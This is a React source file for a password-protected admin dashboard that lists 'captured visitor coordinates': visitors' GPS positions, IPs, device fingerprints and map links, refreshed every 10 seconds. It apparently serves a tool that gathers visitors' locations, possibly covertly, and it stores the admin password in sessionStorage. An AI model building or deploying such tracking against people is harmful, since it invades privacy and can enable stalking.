'use client';

import { useEffect, useState } from 'react';

export default function Admin() {
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [password, setPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [authError, setAuthError] = useState('');

  // Check session storage on mount
  useEffect(() => {
    const savedPassword = sessionStorage.getItem('adminPassword');
    if (savedPassword) {
      setPassword(savedPassword);
      setIsAuthenticated(true);
    } else {
      setLoading(false);
    }
  }, []);

  const fetchLogs = async (currentPassword = password) => {
    if (!currentPassword) return;
    try {
      setLoading(true);
      const res = await fetch('/api/logs', {
        headers: { 'admin-password': currentPassword }
      });
      
      if (res.status === 401) {
        setIsAuthenticated(false);
        setAuthError('Invalid password. Please try again.');
        sessionStorage.removeItem('adminPassword');
        return;
      }

      if (!res.ok) throw new Error('Failed to fetch');

      const data = await res.json();
      setLogs(data);
      setIsAuthenticated(true);
      setAuthError('');
      sessionStorage.setItem('adminPassword', currentPassword);
    } catch (error) {
      console.error('Error fetching logs:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleLogin = (e) => {
    e.preventDefault();
    fetchLogs(password);
  };

  useEffect(() => {
    if (!isAuthenticated) return;
    fetchLogs();
    const interval = setInterval(() => fetchLogs(), 10000);
    return () => clearInterval(interval);
  }, [isAuthenticated]);

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#050505] flex items-center justify-center p-4">
        <div className="bg-[#0a0a0a] border border-[#1a1a1a] rounded-2xl p-8 w-full max-w-md shadow-2xl">
          <h2 className="text-2xl font-bold text-white mb-6 text-center">Admin Login</h2>
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter admin password"
                className="w-full bg-[#111] border border-[#222] text-white px-4 py-3 rounded-lg focus:outline-none focus:border-blue-500 transition-colors"
                required
              />
            </div>
            {authError && <p className="text-red-500 text-sm">{authError}</p>}
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition-colors disabled:opacity-50"
            >
              {loading ? 'Authenticating...' : 'Login'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-white p-8 font-sans">
      <div className="max-w-6xl mx-auto">
        <header className="flex justify-between items-center mb-12">
          <div>
            <h1 className="text-3xl font-bold tracking-tight">Location Dashboard</h1>
            <p className="text-gray-400 mt-1">Real-time captured visitor coordinates</p>
          </div>
          <div className="flex gap-4">
            <button 
              onClick={() => {
                sessionStorage.removeItem('adminPassword');
                setIsAuthenticated(false);
                setPassword('');
              }}
              className="px-4 py-2 bg-red-900/20 text-red-400 border border-red-900/50 rounded-lg hover:bg-red-900/40 transition-colors text-sm font-medium"
            >
              Logout
            </button>
            <button 
              onClick={() => fetchLogs()}
              className="px-4 py-2 bg-[#111] border border-[#222] rounded-lg hover:bg-[#1a1a1a] transition-colors text-sm font-medium"
            >
              Refresh Logs
            </button>
          </div>
        </header>

        {loading && logs.length === 0 ? (
          <div className="flex justify-center py-20">
            <div className="w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
          </div>
        ) : logs.length === 0 ? (
          <div className="text-center py-20 bg-[#0a0a0a] rounded-2xl border border-[#1a1a1a]">
            <p className="text-gray-500">No locations captured yet.</p>
          </div>
        ) : (
          <div className="grid gap-6">
            {logs.map((log) => (
              <div key={log._id || log.id} className="bg-[#0a0a0a] border border-[#1a1a1a] rounded-2xl p-6 hover:border-blue-500/30 transition-all group">

                <div className="grid md:grid-cols-4 gap-6 items-center">
                  <div className="space-y-1">
                    <p className="text-xs font-bold text-gray-500 uppercase tracking-wider">Timestamp</p>
                    <p className="font-medium text-sm">{new Date(log.timestamp).toLocaleString()}</p>
                    <div className="flex items-center space-x-2 mt-1">
                      <p className="text-xs text-blue-400">{log.ip}</p>
                      {log.isReturning ? (
                        <span className="bg-purple-500/10 text-purple-400 text-[10px] px-1.5 py-0.5 rounded border border-purple-500/20 font-bold uppercase">Returning</span>
                      ) : (
                        <span className="bg-green-500/10 text-green-400 text-[10px] px-1.5 py-0.5 rounded border border-green-500/20 font-bold uppercase">New User</span>
                      )}
                    </div>
                  </div>
                  
                  <div className="space-y-1">
                    <p className="text-xs font-bold text-gray-500 uppercase tracking-wider">Visitor ID</p>
                    <p className="font-mono text-[10px] text-gray-400 truncate max-w-[120px]">{log.visitorId || 'Legacy'}</p>
                    <p className="text-xs text-gray-500 font-mono">
                      Coords: {log.lat !== null ? log.lat.toFixed(4) : '---'}, {log.lon !== null ? log.lon.toFixed(4) : '---'}
                    </p>
                  </div>



                  <div className="space-y-1">
                    <p className="text-xs font-bold text-gray-500 uppercase tracking-wider">Device Info</p>
                    <p className="text-xs text-gray-300 truncate max-w-[200px]" title={log.userAgent}>
                      {log.userAgent}
                    </p>
                    <p className="text-[10px] text-gray-500">
                      {log.platform} • {log.screen}
                      {log.accuracy !== null ? ` • ±${log.accuracy.toFixed(1)}m` : ''}
                    </p>
                  </div>

                  <div className="flex justify-end">
                    {log.lat ? (
                      <a 
                        href={log.googleMapsUrl} 
                        target="_blank" 
                        rel="noopener noreferrer"
                        className="inline-flex items-center px-4 py-2 bg-blue-600 text-white rounded-xl text-sm font-bold hover:bg-blue-700 transition-all shadow-lg shadow-blue-500/20 group-hover:scale-105 active:scale-95"
                      >
                        <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd" />
                        </svg>
                        View on Map
                      </a>
                    ) : (
                      <span className="text-xs text-gray-500 font-medium italic">Awaiting GPS Lock...</span>
                    )}
                  </div>


                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
